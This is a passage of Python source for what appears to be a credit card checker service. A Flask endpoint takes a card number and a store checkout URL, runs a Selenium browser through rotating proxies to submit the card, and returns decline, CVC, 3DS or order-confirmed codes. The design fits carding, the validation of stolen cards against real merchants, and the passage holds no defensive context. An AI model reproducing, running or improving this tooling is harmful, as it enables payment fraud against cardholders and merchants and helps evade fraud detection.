                    for kw in ['INCORRECT_ZIP', 'INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'CARD_DECLINED', 'FRAUD_SUSPECTED']:
                        if kw in body_upper and kw not in all_codes:
                            all_codes.append(kw)
                
                if found_code or order_confirmed:
                    break
                
                final_url = driver.current_url
            
            try:
                final_url = driver.current_url
            except:
                pass
            
            if driver:
                driver.quit()
            
            # ==================== نتيجة الاستخراج ====================
            if order_confirmed:
                result_code = 'ORDER_CONFIRMED'
                result_typename = 'OrderConfirmed'
                response_result = f'Order confirmed{f" - Order #{order_number}" if order_number else ""}'
            elif is_3ds or found_code == '3DS_REQUIRED':
                result_code = '3DS_REQUIRED'
                result_typename = found_typename or 'CompletePaymentChallenge'
            elif found_code and found_code not in excluded_codes:
                result_code = found_code
                result_typename = found_typename
            else:
                extracted_code, extracted_typename = extract_code_underscore_priority(all_codes, all_typenames, excluded_codes)
                result_code = extracted_code or (all_codes[0] if all_codes else None) or (all_typenames[0] if all_typenames else None)
                result_typename = extracted_typename
            
            if task_id:
                with active_tasks_lock:
                    if task_id in active_tasks:
                        active_tasks[task_id]["status"] = "completed"
            
            return {
                "success": True if result_code else False,
                "code": result_code,
                "typename": result_typename,
                "response": response_result,
                "price": total_amount,
                "order_number": order_number,
                "checkout_url": checkout_url,
                "final_url": final_url,
                "error": None if result_code else "Code not found",
                "task_id": task_id,
                "proxy_used": f"{proxy_for_browser['host']}:{proxy_for_browser['port']}"
            }
        
        except Exception as e:
            if driver:
                driver.quit()
            return {"success": False, "code": None, "error": str(e), "task_id": task_id}
    
    except Exception as e:
        if driver:
            driver.quit()
        return {"success": False, "code": None, "error": str(e), "task_id": task_id}

# ==================== Routes ====================
@app.route('/', methods=['GET'])
def home():
    cc = request.args.get('cc')
    url = request.args.get('url')
    
    if not cc or not url:
        return jsonify({"success": False, "code": None, "error": "Missing cc or url parameters"})
    
    task_id = f"task_{int(time.time()*1000)}_{random.randint(1000,9999)}"
    future = executor.submit(ff, cc, url, task_id)
    
    try:
        result = future.result(timeout=REQUEST_TIMEOUT)
        return jsonify(result)
    except Exception as e:
        return jsonify({"success": False, "code": None, "error": f"Timeout: {str(e)}", "task_id": task_id})

@app.route('/status', methods=['GET'])
def status():
    with active_tasks_lock:
        return jsonify({
            "active_tasks_count": len(active_tasks),
            "max_workers": MAX_WORKERS,
            "proxy_count": len(PROXY_LIST),
            "proxy_index": proxy_counter % len(PROXY_LIST)
        })

@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        "status": "ok",
        "max_workers": MAX_WORKERS,
        "active_tasks": len(active_tasks),
        "proxy_count": len(PROXY_LIST),
        "chrome_version": get_chrome_major_version()
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    logger.info(f"Server on port {port} | Proxies: {len(PROXY_LIST)} | Chrome: {get_chrome_major_version()}")
    app.run(host='0.0.0.0', port=port, threaded=True)
